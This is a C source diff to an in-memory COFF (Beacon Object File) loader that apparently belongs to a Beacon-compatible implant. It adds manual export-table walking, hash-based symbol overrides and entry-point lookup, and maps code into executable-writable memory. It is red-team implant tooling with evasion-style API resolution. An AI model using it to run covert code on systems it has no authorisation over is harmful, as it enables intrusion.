@@ -5,11 +5,16 @@
 #include "Task.h"
 #include "Config.h"
 #include "BeaconCompatibility.h"
+#include "Utils.h"
+#include "Debug.h"
+
+#include <string.h>
+#include <stdlib.h>
 
 #if defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
 
-/*
-    Most code is from here https://github.com/Ap3x/COFF-Loader/tree/main/Src
+/**
+ * Reference - https://github.com/Ap3x/COFF-Loader/tree/main/Src
 */
 
 /*
@@ -28,6 +33,115 @@ BOOL InternalFunctionMatch(char* StrippedSymbolName) {
     return FALSE;
 }
 
+static const COFF_SYM_OVERRIDE *g_coffOverrides = NULL;
+static int g_coffOverrideCount = 0;
+static BOOL g_coffEatResolve = FALSE;
+
+static BOOL PeNameEq(const char *a, const char *b)
+{
+    if (!a || !b)
+        return FALSE;
+    while (*a && *b && *a == *b) {
+        a++;
+        b++;
+    }
+    return *a == *b;
+}
+
+FARPROC CoffPeGetProcAddress(HMODULE mod, const char *name)
+{
+    BYTE *base;
+    IMAGE_DOS_HEADER *dos;
+    IMAGE_NT_HEADERS64 *nt;
+    IMAGE_DATA_DIRECTORY *dir;
+    IMAGE_EXPORT_DIRECTORY *exp;
+    DWORD *names;
+    WORD *ords;
+    DWORD *funcs;
+    DWORD i;
+    DWORD rva;
+    BYTE *addr;
+    char fwd[256];
+    char *dot;
+    HMODULE fwdMod;
+    int depth = 0;
+
+    if (!mod || !name)
+        return NULL;
+
+again:
+    if (depth++ > 8)
+        return NULL;
+
+    base = (BYTE *)mod;
+    dos = (IMAGE_DOS_HEADER *)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        return NULL;
+    nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        return NULL;
+    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!dir->VirtualAddress || !dir->Size)
+        return NULL;
+    exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
+    names = (DWORD *)(base + exp->AddressOfNames);
+    ords = (WORD *)(base + exp->AddressOfNameOrdinals);
+    funcs = (DWORD *)(base + exp->AddressOfFunctions);
+
+    for (i = 0; i < exp->NumberOfNames; i++) {
+        const char *n = (const char *)(base + names[i]);
+        if (!PeNameEq(n, name))
+            continue;
+        rva = funcs[ords[i]];
+        addr = base + rva;
+        if (rva >= dir->VirtualAddress && rva < dir->VirtualAddress + dir->Size) {
+            SIZE_T k;
+            for (k = 0; k < sizeof(fwd) - 1 && addr[k]; k++)
+                fwd[k] = (char)addr[k];
+            fwd[k] = 0;
+            dot = strrchr(fwd, '.');
+            if (!dot || !dot[1])
+                return NULL;
+            *dot = 0;
+            fwdMod = GetModuleHandleA(fwd);
+            if (!fwdMod)
+                fwdMod = LoadLibraryA(fwd);
+            if (!fwdMod) {
+                char dll[260];
+                SIZE_T ln = 0;
+                while (fwd[ln] && ln < sizeof(dll) - 5) {
+                    dll[ln] = fwd[ln];
+                    ln++;
+                }
+                dll[ln++] = '.'; dll[ln++] = 'd'; dll[ln++] = 'l'; dll[ln++] = 'l'; dll[ln] = 0;
+                fwdMod = GetModuleHandleA(dll);
+                if (!fwdMod)
+                    fwdMod = LoadLibraryA(dll);
+            }
+            if (!fwdMod)
+                return NULL;
+            if (dot[1] == '#')
+                return GetProcAddress(fwdMod, (LPCSTR)(ULONG_PTR)strtoul(dot + 2, NULL, 10));
+            {
+                char keep[128];
+                SIZE_T kn = 0;
+                const char *fn = dot + 1;
+                while (fn[kn] && kn < sizeof(keep) - 1) {
+                    keep[kn] = fn[kn];
+                    kn++;
+                }
+                keep[kn] = 0;
+                memcpy(fwd, keep, kn + 1);
+            }
+            mod = fwdMod;
+            name = fwd;
+            goto again;
+        }
+        return (FARPROC)addr;
+    }
+    return NULL;
+}
+
 void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
     void* functionaddress = NULL;
     char localSymbolNameCopy[1024] = { 0 };
@@ -35,7 +149,6 @@ void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
     char* locallib = NULL;
     char* localfunc = SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1;
     HMODULE llHandle = NULL;
-    // strncpy_s(localSymbolNameCopy, SymbolName, sizeof(localSymbolNameCopy) - 1);
     strncpy_s(localSymbolNameCopy, sizeof(localSymbolNameCopy), SymbolName, sizeof(localSymbolNameCopy) - 1);
     char* context = NULL;
 
@@ -44,10 +157,15 @@ void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
 
         localfunc = SymbolName + strlen(PREPENDSYMBOLVALUE);
         UINT32 hash = custom_hash(localfunc);
-    
+        int i;
+
         BeaconCompatibilityEnsureHashes();
 
-        // Compare function hashes
+        for (i = 0; i < g_coffOverrideCount; i++) {
+            if (g_coffOverrides[i].addr && g_coffOverrides[i].hash == hash)
+                return g_coffOverrides[i].addr;
+        }
+
         for (int tempcounter = 0; tempcounter < INTERNAL_FUNCTIONS_COUNT; tempcounter++) {
             if (InternalFunctions[tempcounter][0] != NULL) {
                 if (hash == (UINT32)(ULONG_PTR)InternalFunctions[tempcounter][0]) {
@@ -56,29 +174,33 @@ void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
                 }
             }
         }
+        return NULL;
     }
     else {
-        //_dbg("\t\tExternal Symbol\n");
         locallib = strtok_s(localSymbolNameCopy + sizeof(PREPENDSYMBOLVALUE) - 1, "$", &context);
         llHandle = LoadLibraryA(locallib);
 
-        //_dbg("\t\tHandle: 0x%lx\n", llHandle);
         localfunc = strtok_s(NULL, "$", &context);
         localfunc = strtok_s(localfunc, "@", &context);
-        functionaddress = GetProcAddress(llHandle, localfunc);
-        //_dbg("\t\tProcAddress: 0x%p\n", functionaddress);
+
+        if (g_coffEatResolve)
+            functionaddress = (void *)CoffPeGetProcAddress(llHandle, localfunc);
+        if (!functionaddress)
+            functionaddress = GetProcAddress(llHandle, localfunc);
         return functionaddress;
     }
+    return NULL;
 }
 
-BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
+void *CoffFindEntry(COFF_RUNTIME_t* rt, char* func)
+{
+    COFF_t* COFF;
     VOID(*foo)(char* in, UINT32 datalen) = NULL;
 
-    if (!func || !COFF->FileBase)
-	{
-		_dbg("No entry provided");
-		return FALSE;
-	}
+    if (!rt || !func || !rt->coff.FileBase)
+        return NULL;
+
+    COFF = &rt->coff;
 
     char* stringTable = (char*)(COFF->SymbolTable + COFF->FileHeader->NumberOfSymbols);
     for (UINT32 counter = 0; counter < COFF->FileHeader->NumberOfSymbols; counter += 1 + COFF->SymbolTable[counter].NumberOfAuxSymbols)
@@ -86,34 +208,48 @@ BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
         char* symName;
         char inlineName[9] = {0};
         if (COFF->SymbolTable[counter].first.Name[0] != 0)
-		{
+        {
             memcpy(inlineName, COFF->SymbolTable[counter].first.Name, 8);
             symName = inlineName;
         }
-		else 
-		{
+        else
+        {
             symName = stringTable + COFF->SymbolTable[counter].first.value[1];
         }
-		
+
         if (strcmp(symName, func) == 0)
-		{
+        {
             UINT16 secNum = COFF->SymbolTable[counter].SectionNumber;
             if (secNum == 0 || COFF->SectionMapped[secNum - 1] == NULL)
-			{
-                //_dbg("Entry symbol found but section not loaded (secNum=%d)\n", secNum);
                 continue;
-            }
             foo = (void(*)(char*, UINT32))((char*)COFF->SectionMapped[secNum - 1] + COFF->SymbolTable[counter].Value);
         }
     }
 
-    if (!foo)
-	{
-		_dbg("Couldn't find entry point");
-		return FALSE;
-	}
+    return (void *)foo;
+}
 
-	_dbg("Trying to run: 0x%p\n\n", foo);
+BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
+    VOID(*foo)(char* in, UINT32 datalen) = NULL;
+    COFF_RUNTIME_t tmp;
+
+    if (!func || !COFF || !COFF->FileBase)
+    {
+        _dbg("No entry provided");
+        return FALSE;
+    }
+
+    memset(&tmp, 0, sizeof(tmp));
+    tmp.coff = *COFF;
+    foo = (VOID(*)(char*, UINT32))CoffFindEntry(&tmp, func);
+
+    if (!foo)
+    {
+        _dbg("Couldn't find entry point");
+        return FALSE;
+    }
+
+    _dbg("Trying to run: 0x%p\n\n", foo);
 
     foo((char*)args, argSize);
     return TRUE;
@@ -179,12 +315,21 @@ void RelocationTypeParse(COFF_t* COFF, void** SectionMapped, int SectionNumber, 
     //_dbg("\tSectionNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber);
 }
 
-BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
+BOOL CoffMapEx(char* FileData, COFF_RUNTIME_t* out, const COFF_SYM_OVERRIDE *ov, int ovCount, BOOL eatResolve)
 {
+    const COFF_SYM_OVERRIDE *savedOv = g_coffOverrides;
+    int savedCount = g_coffOverrideCount;
+    BOOL savedEat = g_coffEatResolve;
+    BOOL ok = FALSE;
+
     if (!FileData || !out)
         return FALSE;
 
     memset(out, 0, sizeof(COFF_RUNTIME_t));
+
+    g_coffOverrides = ov;
+    g_coffOverrideCount = ovCount;
+    g_coffEatResolve = eatResolve;
 
     out->coff.FileBase = FileData;
     out->coff.FileHeader = (FileHeader_t*)out->coff.FileBase;
@@ -195,14 +340,14 @@ BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
 
     out->sectionMapped = (void**)calloc(sizeof(char*) * (out->numberOfSections + 1), 1);
     if (!out->sectionMapped)
-        return FALSE;
+        goto done;
     out->coff.SectionMapped = out->sectionMapped;
 
     if ((int)out->coff.FileHeader->Machine != IMAGE_FILE_MACHINE_AMD64) {
         _dbg("[!] This common object file format is not supported yet :)");
         free(out->sectionMapped);
         out->sectionMapped = NULL;
-        return FALSE;
+        goto done;
     }
 
     for (byte i = 0; i < out->numberOfSections; i++) {
@@ -227,7 +372,7 @@ BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
     out->functionMapping = (char*)VirtualAlloc(NULL, out->coff.RelocationsCount * 8, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
     if (!out->functionMapping && out->coff.RelocationsCount > 0) {
         CoffUnmap(out);
-        return FALSE;
+        goto done;
     }
 
     for (int s = 0; s < out->numberOfSections; s++) {
@@ -257,7 +402,18 @@ BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
         }
     }
 
-    return TRUE;
+    ok = TRUE;
+
+done:
+    g_coffOverrides = savedOv;
+    g_coffOverrideCount = savedCount;
+    g_coffEatResolve = savedEat;
+    return ok;
+}
+
+BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
+{
+    return CoffMapEx(FileData, out, NULL, 0, FALSE);
 }
 
 BOOL CoffExecute(COFF_RUNTIME_t* rt, char* EntryName, char* argumentdata, unsigned long argumentsize)
